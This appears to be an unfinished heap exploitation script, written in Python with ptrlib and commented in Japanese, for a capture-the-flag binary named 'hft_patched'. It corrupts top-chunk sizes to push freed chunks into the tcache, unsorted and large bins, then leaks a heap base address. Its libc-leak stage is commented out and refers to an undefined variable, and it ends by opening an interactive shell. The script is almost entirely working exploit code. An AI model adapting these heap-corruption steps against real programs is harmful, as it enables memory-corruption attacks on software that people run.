#!/usr/bin/env python
import ptrlib as ptr


elf = ptr.ELF("./hft_patched")
libc = ptr.ELF("libc.so.6")
io = ptr.Process(elf.filepath)


def create(size, data):
    io.recvuntil(b"[PKT_RES]")
    io.send(ptr.p64(size))
    io.sendline(data)


p64 = ptr.p64
p32 = ptr.p32
u64 = ptr.u64
info = ptr.logger.info

####################################
### SETUP BIN
####################################

# 一番はじめのTOP CHUNKのサイズを0x41に書き換える
create(0xD28, p64(0x0) + b"A" * 0xD18 + p32(0x41))
# サイズが0x41を超えるMALLOCがなされるので、TOP CHUNKがFREEされて、TCACHE BINに加わる
# 同時に、拡張された後のTOP CHUNKのサイズを0x441に書き換える。
create(0xBB0, p64(0x0) + b"B" * (0xBB0 - 8) + p32(0x441))
# サイズが0x441を超えるMALLOCがなされるので、TOP CHUNKがFREEされて、UNSORTED BINに加わる
create(0x419, p64(0x3)[:-1])

# よくわからないのだが、新しい領域を確保すると、TOP CHUNKがFREEされてできたUNSORTED BINの
# CHUNKのサイズがその領域分だけ削られて用意される

####################################
### LEAK HEAP ADDRESS
####################################

# よくわからないが、これで確保される領域にヒープアドレスが含まれている。
# 0x1でその値を読み取れるようにする。ここで注意だが、オプションの0x1を8バイトで送ると、NULLがデータの方に溢れて
# ヒープアドレスを読み取るときに、その領域がNULLで始まってしまってアドレスが読み取れなくなる。だから7バイトで送る。
# 8バイトの場合 | 0x0000000000000028 | 0x0000000000000001 | 0x000055555557cb00 | <- NULLが溢れてる
# 7バイトの場合 | 0x0000000000000028 | 0x0000000000000001 | 0x000055555557cbc0 |
create(0x28, p64(0x1)[:-1])
io.recvuntil(b":[")
heap_base = u64(io.recvline().strip(b"]")) - 0x21BC0
info(f"Heap Base: {hex(heap_base)}")

####################################
### SETUP BIN
####################################

#### LARGE BIN
# TOP CHUNKのサイズを0x441に書き換える
create(0x780, p64(0) + b"C" * (0x780 - 8) + p32(0x441))
# LARGE BINに加えつつ、次のTOP CHUNKのサイズを0x441に書き換える
create(0xBB0, p64(0) + b"D" * (0xBB0 - 8) + p32(0x441))

create(0xBB0, p64(0x3)[:-1])
create(0xBB0, p64(0x3) + b"EEEE")

#####################################
#### LEAK LIBC ADDRESS
#####################################

# payload = b"a" * (8 * 6)
# payload += ptr.p64(heap_addr - 8 * 4 + 0x30 + 0xA0)
# print(hex(heap_addr - 8 * 4 + 0x30 + 0xA0))
# payload += ptr.p64(heap_addr + 0x30)  # 0x30 bin
# payload += ptr.p64(heap_addr + 0x30)  # 0x40 bin
# payload += ptr.p64(heap_addr + 0x30)  # 0x50 bin
# payload += ptr.p64(heap_addr + 0x30)  # 0x60 bin
# payload += ptr.p64(heap_addr + 0x30)  # 0x70 bin
#
# create(0x80, payload)
# create(0x30001, b"a\0a" + b"a" * (0x10000 - 3) + b"b" * (136920) + ptr.p64(heap_addr - 0x10))


io.sh()
